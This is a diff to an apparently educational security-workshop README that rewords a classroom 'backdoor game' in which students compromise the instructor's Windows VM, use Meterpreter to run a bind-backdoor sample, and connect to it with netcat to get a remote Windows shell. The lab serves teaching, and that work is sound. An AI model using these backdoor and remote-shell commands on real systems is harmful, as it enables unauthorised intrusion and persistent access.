@@ -25,24 +25,24 @@ The same vulnerability can be exploited for a denial of service (DoS) attack. In
 
 ### Overview
 
-We want to show the danger of getting exploited and post-exploitation. If a compromised computer is planted with a backdoor, the attacker will be able to log into the compromised computer anytime later if the compromised computer is not fixed. 
+We want to understand the danger of getting exploited. If a compromised computer is planted with a backdoor, the attacker will be able to log into the compromised computer anytime later if the compromised computer is not fixed. 
 
 ### Backdoor game
 
 1. Refer to Hands-on 2 of <a href="https://github.com/xinwenfu/GenCyber/tree/main/SoftwareSecurity">Lecture 2 Penetration Testing and Software Security</a>. Hack into the instructor's Windows VM
    - The instructor will show the IP of the Windows VM
-2. Once the instructor's VM is compromised, start a Meterpreter shell. 
-   - The Meterpreter shell can be used to upload a malware program from the attacker's computer to the victim computer. Let's assume the attacker uploads the malware, which is C:\Workshop\MalwareSamples\Backdoors\SimpleBindBackdoor\nice3.exe
-   - The Meterpreter shell can be used to <a href="https://pentestwiki.org/metasploit-meterpreter-cheat-sheet/">execute the uploaded malware</a>. Run the following command to run the backdoor within the Meterprester shell
+2. Once the instructor's VM is compromised, you start a Meterpreter shell. 
+   - The Meterpreter shell can be used to upload a malware program from the attacker's computer to the victim computer. Let's assume the attacker uploaded the malware, which is C:\Workshop\MalwareSamples\Backdoors\SimpleBindBackdoor\nice3.exe
+   - The Meterpreter shell can also be used to <a href="https://pentestwiki.org/metasploit-meterpreter-cheat-sheet/">execute the uploaded malware</a>. Run the following command within the Meterprester shell to run the backdoor
 ```
 execute -f C:\\Workshop\\MalwareSamples\\Backdoors\\SimpleBindBackdoor\\nice3.exe
 ```
-3. Start a terminal on your Kali VM and run the following command to log into the backdoor running on the instructor's Window VM
+3. Start a terminal on your Kali VM and run the following command to log into the backdoor running on the instructor's Window VM. Change *victim-ip* of the command to the instructor's Windows VM IP
 ```
 nc victim-ip 8080
 ```
 
-Here is an example of a succesful login of the backdoor
+Here is an example of a succesful login
 ```
 $ nc 192.168.1.27 8080
 Microsoft Windows [Version 10.0.19044.1826]
@@ -51,7 +51,7 @@ Microsoft Windows [Version 10.0.19044.1826]
 C:\Tools\vchat\Server>
 ```
 
-Run a *dir* command and what do you see?
+Run a *dir* command within the Windows console. What do you see?
 
 4. Tell the instructor once you can get into the backdoor. 
 5. Other students can try to log into the backdoor similarly and notify the instructor if they can do it
